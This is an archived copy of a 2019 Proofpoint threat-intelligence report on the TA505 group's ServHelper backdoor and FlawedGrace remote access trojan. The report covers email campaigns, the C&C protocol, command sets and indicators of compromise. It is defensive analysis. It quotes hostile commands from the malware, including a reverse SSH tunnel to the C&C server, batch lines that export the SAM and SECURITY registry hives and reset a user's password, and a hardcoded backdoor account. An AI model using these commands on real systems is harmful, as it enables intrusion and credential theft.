{
    "id": "544c9fde-9d24-4759-a30c-58932e36977e",
    "created_at": "2023-01-12T15:08:22.220165Z",
    "updated_at": "2025-03-27T02:15:37.972622Z",
    "deleted_at": null,
    "sha1_hash": "6e87895e35f9601f67b23e52d34592dc99084023",
    "title": "2019-01-09 - ServHelper and FlawedGrace - New malware introduced by TA505",
    "authors": "",
    "file_creation_date": "2022-05-28T19:10:59Z",
    "file_modification_date": "2022-05-28T19:10:59Z",
    "file_size": 3677651,
    "plain_text": "# ServHelper and FlawedGrace - New malware introduced by TA505\n\n**[proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505](https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505)**\n\nJanuary 9, 2019\n\n\n-----\n\n[Blog](https://www.proofpoint.com/us/blog)\n[Threat Insight](https://www.proofpoint.com/us/blog/threat-insight)\nServHelper and FlawedGrace - New malware introduced by TA505\n\n\n-----\n\nJanuary 09, 2019 Dennis Schwarz and Proofpoint Staff\n\n**Overview**\n\nFor much of 2018, we observed threat actors increasingly distributing downloaders, backdoors, information\nstealers, remote access Trojans (RATs), and more as they abandoned ransomware as their primary\n[payload. In November 2018, TA505, a prolific actor that has been at the forefront of this trend, began](https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times)\ndistributing a new backdoor we named “ServHelper”. ServHelper has two variants: one focused on remote\ndesktop functions and a second that primarily functions as a downloader. Additionally we have observed the\ndownloader variant download a malware we call “FlawedGrace.” FlawedGrace is a full-featured RAT that\nwe first observed in November 2017. TA505 appears to be actively targeting banks, retail businesses, and\nrestaurants as they distribute these malware families. This targeting falls in line with other activity we\nreported earlier in 2018.[1] [2]\n\n**Campaign Analysis**\n\n_November 9 “Tunnel” Campaign_\n\nOn November 9, 2018, we observed a relatively small email campaign (thousands of messages) delivering\na new malware family that we call “ServHelper” based on file names associated with infection. The\ncampaign primarily targeted financial institutions and was attributed to the threat actor TA505. The\nmessages (Figure 1) contained Microsoft Word or Publisher attachments with macros that, when enabled,\ndownloaded and executed the malware. This campaign used the “tunnel” variant of ServHelper, described\nin the “Malware Analysis” section.\n\n\n-----\n\n_Figure 1: Example email message from the November 9 “tunnel” campaign_\n\n_November 15 “Downloader” Campaign_\n\nOn November 15, 2018, we saw a similar, but larger campaign (tens of thousands of messages) from the\nsame actor. In addition to financial institutions, this campaign also targeted the retail industry. The\nmessages (Figure 2) contained Microsoft “.doc”, “.pub”, or “.wiz” attachments. The documents contained\nmacros that, when enabled, downloaded and executed the ServHelper malware. This campaign used the\n“downloader” variant of ServHelper with the tunneling functionality removed.\n\n_Figure 2: Example email message from the November 15 “downloader” campaign_\n\n_December 13 “FlawedGrace” Campaign_\n\nOn December 13, 2018, we observed another large ServHelper “downloader” campaign targeting retail and\nfinancial services customers. The messages used a mixture of Microsoft Word attachments with embedded\nmalicious macros, PDF attachments with URLs linking to a fake “Adobe PDF Plugin” webpage linking to the\nmalware (Figure 3), and direct URLs in the email body linking to a ServHelper executable.\n\n\n-----\n\n_Figure 3: Example PDF attachment containing a URL linking to the fake “Adobe PDF Plugin” page_\n\nIn this campaign, we observed ServHelper download (Figure 4) and execute an additional malware that we\ncall “FlawedGrace.” FlawedGrace is a robust remote access trojan (RAT) that we initially encountered in\nNovember 2017, but have rarely observed since.\n\n_Figure 4: Fiddler screenshot showing ServHelper downloading FlawedGrace_\n\n**ServHelper Malware Analysis**\n\n\n-----\n\nServHelper is a new malware family -- best classified as a backdoor -- that we first observed in the wild in\nNovember 2018. Its name is based on a filename (ServHelper.dll) that we noted in the November 9 “tunnel”\ncampaign described above. A sample from a later campaign used command and control (C&C) URIs\ncontaining “/rest/serv.php” which also reference a “serv” component.\n\nThe malware is written in Delphi and at the time of this writing is being actively developed. New commands\nand functionality are being added to the malware in almost every new campaign so we will not focus on one\nspecific sample for this analysis. Rather, we will discuss the malware family generally; see the “Indicators of\nCompromise” section below for specific reference samples.\n\nAs noted, there are two distinct variants of ServHelper: a “tunnel” variant and a “downloader” variant. The\n“tunnel” variant has more features and focuses on setting up reverse SSH tunnels to allow the threat actor\nto access the infected host via Remote Desktop Protocol (RDP). Once ServHelper establishes remote\ndesktop access, the malware contains functionality for the threat actor to “hijack” legitimate user accounts\nor their web browser profiles and use them as they see fit. The “downloader” variant is stripped of the\ntunneling and hijacking functionality and is used as a basic downloader.\n\nBoth variants of ServHelper use the same HTTP C&C protocol on port 443 (HTTPS) and, less frequently,\nport 80 (HTTP). An example of the initial phone home to the C&C server is shown in Figure 5.\n\n_Figure 5: Example of ServHelper’s initial phone home_\n\nEarly versions of the malware used a semi-random URI such as: “/ghuae/huadh.php”. Newer versions have\nstarted using more typical URIs such as:\n\n/support/form.php\n/rest/serv.php\n/sav/s.php\n\nMost of the C&C domains that we have observed have been in the “.pw” top-level domain (TLD) such as:\n\nchecksolutions[.]pw\nafgdhjkrm[ ]pw\n\n\n-----\n\npointsoft[.]pw\ndedoshop[.]pw\n\nHowever, recently the developer has added support for “.bit” C&C domains; this TLD is associated with the\ncryptocurrency Namecoin and requires special DNS servers that the malware uses:\n\ndedsolutions[.]bit\narepos[.]bit\n\nThe POST data in these C&C communications contains three URL-encoded parameters: “key”, “sysid”, and\n“resp”. The “key” parameter is a hardcoded string in the malware that does not appear to be used\nelsewhere in the code. Examples of observed keys include:\n\nGsiss744@sd\nasdgdgYss455\n#567sisGdsa\n\nThe “sysid” parameter contains a campaign ID in newer versions of the malware, the Windows version\nrunning on the infected machine, system architecture, username, and a random integer. Examples of\nobserved campaign IDs include:\n\nclean12\nchistka12.17\nnoP_19\nnonRDP\nno24\nny_upd\n\nThe “resp” parameter contains responses to commands received from the controller.\n\nAn example command sent from the C&C server to the infected machine can be seen in the Fiddler\nscreenshot in Figure 4 above. It contains a command, carrot (“^”) delimiter, and command arguments. We\nobserved the following commands in the malware:\n\n**nop**\n\nImplements a keep-alive type of functionality. The infected machine responds to the C&C server with a “nop\nok” message.\n\n**tun (“tunnel” variant only)**\n\nSets up a reverse SSH tunnel connecting the C&C server to the infected system’s RDP port (3389). In\nearlier versions, a loader component performed the initial setup for this and other commands by:\n\nExtracting and dropping an OpenSSH binary from its PE resources\nExtracting, dropping, and configuring the RDP Wrapper Library software from its PE resources\nCreating a new user “supportaccount” with a password of “Ghar4f5”\nAdding this user to the “Remote Desktop Users” and “Administrators” groups\n\nIn more recent versions, this functionality of the loader component was integrated into the core ServHelper\ncode, using built-in Windows remote desktop support instead of a third-party software package. This\ncommand sets up a reverse SSH tunnel by executing the dropped OpenSSH binary with the following\ncommand line arguments:\n\n\n-----\n\n_-N -R <remote port>:localhost:3389 tunnel@<C&C server>_\n\nOnce configured, ServHelper sends a “tun ok\\r\\nport:<remote port> tun pid:<SSH process id>” to the C&C\nserver.\n\n**slp**\n\nSets a sleep timeout.\n\n**fox (“tunnel” variant only)**\n\nCopies a Firefox web browser profile from one user to another. Earlier versions used the Windows “xcopy”\ncommand. Later versions download a self-extracting RAR file from the C&C server (/cp/cp.exe) and\ndecompress it using the password “123”. One of the files in this archive is a piece of software known as\n\"Runtime's Shadow Copy\" and it is used to copy the web browser profiles.\n\n**chrome (“tunnel” variant only)**\n\nSimilar to the “fox” command but for Chrome web browser profiles.\n\n**killtun (“tunnel” variant only)**\n\nKills an SSH tunnel process associated with a particular remote port. Once killed, it sends a “killtun ok”\nmessage to the C&C server.\n\n**tunlist (“tunnel” variant only)**\n\nGets a list of all active SSH tunnels and responds to the C&C server with a message containing “active tun:\n<remote port>” entries for each active tunnel.\n\n**killalltuns (“tunnel” variant only)**\n\nKills all SSH tunnel processes.\n\n**shell**\n\nExecutes a shell command and sends the response to the C&C server.\n\n**load**\n\nDownloads and runs an executable from a specified URL. Responds to the C&C server with either “load no\nparam ok” or “load param ok” depending if any command-line arguments were passed to the downloaded\nexecutable.\n\n**socks (“tunnel” variant only)**\n\nSimilar to the “tun” command, but allows a reverse SSH tunnel to be built between the C&C server to any\nserver/port (as specified by the command argument) through the infected system. Once configured, a\n“socks ok\\r\\nport:<remote port> tun pid:<SSH process id>” message is sent to the C&C server.\n\n**selfkill**\n\nRemoves the malware from the infected machine.\n\n**loaddll (“downloader” variant only)**\n\n\n-----\n\nA newer command that has only been observed in the downloader variant. Similar to the load command,\nbut for DLLs.\n\n**bk (“tunnel” variant only)**\n\nA newer command similar to the “tun” command. “bk” allows the reverse SSH tunnel to be set up using a\nC&C specified remote host instead of the hardcoded C&C server.\n\n**hijack (“tunnel” variant only)**\n\nA newer command that appears to hijack a user account with a known password (“123”). It does so by\ncreating and scheduling a task “test” to run a batch file containing the following commands:\n\nreg export hklm\\sam c:\\sam.reg\nreg export hklm\\security c:\\sec.reg\nnet user <command argument username> 123\n\nIt then schedules a task “test2” to run another batch file containing the following commands:\n\nschtasks /delete /tn \"test\" /F\nreg import c:\\sam.reg\nreg import c:\\sec.reg\nschtasks /delete /tn \"test2\" /F\n\nFinally it runs the first scheduled task ands send a “ready! try to login with pass 123” message to the C&C\nserver.\n\n**forcekill (“tunnel” variant only)**\n\nA newer command that is similar to the “killalltuns” but uses the Windows “taskkill” command.\n\n**sethijack (“tunnel” variant only)**\n\nA newer command that controls an “alerting” mechanism. A separate program thread monitors user logons.\nWhen a legitimate user becomes active and the threat actor is connected to the infected system using the\npreviously created “supportaccount” account, it runs the “chrome” and “fox” commands, copying the\nlegitimate user’s web browser profiles to the “supportaccount” user. It then alerts the threat actor by sending\nmessage boxes containing “login detected, begin hijacking” and “profiles hijacked!” messages. These are\nsent by a “msg.exe” program contained in the “cp.exe” archive discussed in the “fox” command above.\n\n**chromeport (“tunnel” variant only)**\n\nA newer command that implements the same functionality as the “chrome” command.\n\nDuring some of the ServHelper “downloader” campaigns, we observed commands (e.g., as shown in Figure\n4 above) instructing the malware to download and execute another malware we call “FlawedGrace”.\n\n**FlawedGrace Malware Analysis**\n\nFlawedGrace is a remote access trojan (RAT) named after debugging artifacts (class names) left in the\nanalyzed sample (see Figure 6).\n\n\n-----\n\n_Figure 6: “Grace” class names shown by IDA Pro_\n\nThe malware is written in C++. It is a very large program and makes extensive use of object-oriented and\nmultithreaded programming techniques. This makes reverse engineering and debugging the malware both\ndifficult and time consuming. The coding style and techniques suggest that FlawedGrace was not written by\nthe same developer as ServHelper.\n\nWe initially observed FlawedGrace in an email campaign as early as November 2017, but until the recent\nServHelper campaigns, we had not observed it being actively distributed again. The malware usually\ncontains a debug string including a “version number” and “build date” distinct from the PE compile\ntimestamp, allowing searches of various malware repositories to find additional versions:\n\nUnknown version number built at “Aug 7 2017 22:28:47”\nVersion 2.0.7 built at “Oct 18 2017 04:18:39”\nVersion 2.0.8 built at “Oct 26 2017 12:05:44”\nVersion 2.0.9 built at “Nov 4 2017 22:28:10”\nVersion 2.0.10 built at “Nov 20 2017 10:53:33”\nVersion 2.0.11 built at “Dec 16 2017 08:02:46”\n\nPer the malware’s debug strings, significant development took place during the end of 2017. The\nServHelper campaigns were distributing version 2.0.10 of the malware.\n\nFlawedGrace creates, encrypts, and stores a configuration file containing the C&C IPs and ports in a “<hex\ndigits>.dat” file (e.g., “C:\\ProgramData\\21851a60.dat”). The first 16 bytes of the file are an AES initialization\nvector (IV). The rest of the data is AES-encrypted in CBC mode. In the analyzed sample, the AES key was\n\n\n-----\n\nhardcoded as c3oeCSIfx0J6UtcV . Once decrypted, the configuration data is stored as a custom\nserialization (Figure 7). Early versions of the malware used the class names “GraceParams” and\n“GraceValue” when interacting with this part of the code, so it is likely that the serialization was designed\nand developed by the malware developer and not a standard format.\n\n_Figure 7: Plaintext configuration file showing C&C IP and port_\n\nFlawedGrace uses a complicated binary protocol for its command and control. It can use a configurable\nport for communications, but all samples we have observed to date have used port 443. Figure 8 shows an\nexample of the first four messages between an infected system and C&C server.\n\n\n-----\n\n_Figure 8: FlawedGrace’s initial C&C communications._\n\nWe are still reverse engineering and documenting the protocol, but we can provide an overview of the initial\nC&C communications below:\n\n**Message 1**\n\nInitial beacon from infected system. It is a 14-byte binary structure that contains at least the following parts:\n\nOffset 0x0: CRC32 hash of remaining data (DWORD)\nOffset 0x4: magic bytes \"GCRG\" (DWORD)\n\n**Message 2**\n\nKey verification message from infected system. We believe that this is used to verify that one of the\nencryption keys (static key) is the same on both the malware and C&C server. It is a 52-byte binary\nstructure that contains the following analyzed offsets, among other components still under analysis:\n\nOffset 0x0: CRC32 hash of remaining data (DWORD)\n\n\n-----\n\nOffset 0x14: MD5 hash of the following pieces (16 bytes)\n\nA static key which has always been “static pass” in the samples analyzed\nThe random bytes at offset 0x24 that have been hex encoded and uppercased\nOffset 0x24: random bytes (16 bytes)\n\n**Message 3**\n\nKey exchange message from C&C server. This message delivers a second encryption key (dynamic key)\nused for further data transfers. It is a 42-byte structure that contains the following analyzed offsets, among\nother components still under analysis:\n\nOffset 0x0: CRC32 hash of remaining data (DWORD)\nOffset 0x1a: dynamic key (16 bytes)\n\n**Message 4**\n\nAn example of data transfer between infected system and C&C server. It starts with a 38-byte binary header\nthat contains the following analyzed offsets, among other components still under analysis:\n\nOffset 0x0: CRC32 hash of the next 10 bytes (DWORD)\nOffset 0xE: AES IV (16 bytes)\n\nFollowing the header is the data that has been AES-encrypted in CBC mode. The AES key is generated\nusing the “static key” and the “dynamic key” from messages 3 and 4 above. An example of key generation\nin Python appears in Figure 9.\n\n_Figure 9: Example FlawedGrace C&C data transfer encryption key generation in Python_\n\nFigure 10 shows an example of the plaintext data transferred in message 4.\n\n\n-----\n\n_Figure 10: Example FlawedGrace C&C message 4 plaintext data_\n\n\n-----\n\nThis message contains various system and malware information that has been serialized using the same\nmethod as for configuration files. The serialized data is then packaged within additional binary data\nstructures.\n\nWhile there are other message types with their own formats, the examples here provide initial insight into\nFlawedGrace’s C&C protocol.\n\nFlawedGrace also uses a series of commands, provided below for reference:\n\ntarget_remove\ntarget_update\ntarget_reboot\ntarget_module_load\ntarget_module_load_external\ntarget_module_unload\ntarget_download\ntarget_upload\ntarget_rdp\ntarget_passwords\ntarget_servers\ntarget_script\ndestroy_os\ndesktop_stat\n\n**Conclusion**\n\nThreat actor TA505 is both consistent and prolific. When the group distributes new malware, it may be a blip\n(like Bart ransomware, which was only distributed for one day in 2016) or like Locky ransomware it may\nbecome the dominant strain of malware in the wild. In this case, the group has started distributing two\nvariants on a new backdoor we named ServHelper and a RAT we call FlawedGrace. This also extends the\ntrend that emerged in 2018, in which threat actors increasingly focused on distribution of downloaders,\ninformation stealers, RATS, and other malware that can remain resident on victim devices for far longer\nthan destructive, “smash and grab” malware like ransomware. We will continue to observe the distribution\nof these three malware variants but, at this time, they do not appear to be one-offs, but rather long-term\ninvestments by TA505.\n\n**References**\n\n[1] https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalizedattachments\n\n[2] [https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware](https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware)\n\n**Indicators of Compromise (IOCs)**\n\n\n**IOC** **IOC**\n**Type**\n\n\n**Description**\n\n\n-----\n\n52c72a9de2f6e892f07827add85ad913b0541cd5c8449aadc2722f8eb75e548c SHA256 November 9\n“Tunnel”\ncampaign\nattachment\n\nhxxp://officemysuppbox[.]com/staterepository URL November 9\n“Tunnel”\ncampaign\npayload\n\n1b0859ddbdebcb9d2bb46de00d73aa21bc617614b8123054426556783b211bc8 SHA256 November 9\n“Tunnel”\ncampaign\nServHelper\n\nhxxps://checksolutions[.]pw/ghuae/huadh.php URL November 9\n“Tunnel”\ncampaign\nServHelper\nC&C\n\nhxxps://rgoianrdfa[.]pw/ghuae/huadh.php URL November 9\n“Tunnel”\ncampaign\nServHelper\nC&C\n\nhxxps://arhidsfderm[.]pw/ghuae/huadh.php URL November 9\n“Tunnel”\ncampaign\nServHelper\nC&C\n\neb66ebb95a3dcecae64c61f611a9332fbf460d1b8039d3ab7e4f220104a4bec4 SHA256 November 15\n“Downloader”\ncampaign\nattachment\n\nhxxp://offficebox[.]com/host32 URL November 15\n“Downloader”\ncampaign\npayload\n\n3cd7e0a8321259e8446b2a9da775aae674715c74ff4923cfc8ec5102f380d41a SHA256 November 15\n“Downloader”\ncampaign\nServHelper\n\n\n-----\n\nf4b9219f329803dd45afd5646351de456e608dd946830c961ec66c6c25e52cac SHA256 December 13\n“FlawedGrace”\ncampaign\nattachment\n\nhxxp://office365onlinehome[.]com/host32 URL December 13\n“FlawedGrace”\ncampaign\npayload\n\nd56429d6d0222022fe8f4cb35a28cd4fb83f87b666a186eb54d9785f01bb4b58 SHA256 December 13\n“FlawedGrace”\ncampaign\nServHelper\n\nhxxps://afgdhjkrm[.]pw/aggdst/Hasrt.php URL December 13\n“FlawedGrace”\ncampaign\nServHelper\nC&C\n\nefcee275d23b6e71589452b1cb3095ff92b10ab68cd07957b2ad6be587647b74 SHA256 December 13\n“FlawedGrace”\ncampaign\nFlawedGrace\n\n46.161.27[.]241:443 IP:Port December 13\n“FlawedGrace”\ncampaign\nFlawedGrace\nC&C\n\n9fccd107bd0aee3a2f39ad76a49758309c95545d8154b808eec24d2b51dc4579 SHA256 “sethijack”\ncommand\nServHelper\n\nhxxp://dedsolutions[.]bit/sav/s.php URL “sethijack”\ncommand\nServHelper\nC&C\n\nhxxp://dedoshop[.]pw/sav/s.php URL “sethijack”\ncommand\nServHelper\nC&C\n\n\n-----\n\nhxxp://asgaage[.]pw/sav/s.php URL “sethijack”\ncommand\nServHelper\nC&C\n\nhxxp://sghee[.]pw/sav/s.php URL “sethijack”\ncommand\nServHelper\nC&C\n\na9492312f1258567c3633ed077990fe053776cd576aa60ac7589c6bd7829d549 SHA256 “loaddll”\ncommand\nServHelper\n\nhxxps://vesecase[.]com/support/form.php URL “loaddll”\ncommand\nServHelper\nC&C\n\n**ET and ETPRO Suricata/Snort Signatures**\n\n2833522     ETPRO TROJAN Observed Malicious SSL Cert (HuadhServHelper RAT CnC)\n\n2833552     ETPRO TROJAN HuadhServHelper RAT CnC Domain Observed in SNI\n\n2833881     ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)\n\n2833985     ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)\n\n2834074     ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)\n\n2834233     ETPRO TROJAN ServHelper CnC Inital Checkin\n\n2828489     ETPRO TROJAN FlawedGrace CnC Activity\n\nSubscribe to the Proofpoint Blog\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-01-09 - ServHelper and FlawedGrace - New malware introduced by TA505.pdf"
    ],
    "report_names": [
        "2019-01-09 - ServHelper and FlawedGrace - New malware introduced by TA505.pdf"
    ],
    "threat_actors": [
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536102,
    "ts_updated_at": 1743041737,
    "ts_creation_date": 1653765059,
    "ts_modification_date": 1653765059,
    "files": {
        "pdf": "https://archive.orkl.eu/6e87895e35f9601f67b23e52d34592dc99084023.pdf",
        "text": "https://archive.orkl.eu/6e87895e35f9601f67b23e52d34592dc99084023.txt",
        "img": "https://archive.orkl.eu/6e87895e35f9601f67b23e52d34592dc99084023.jpg"
    }
}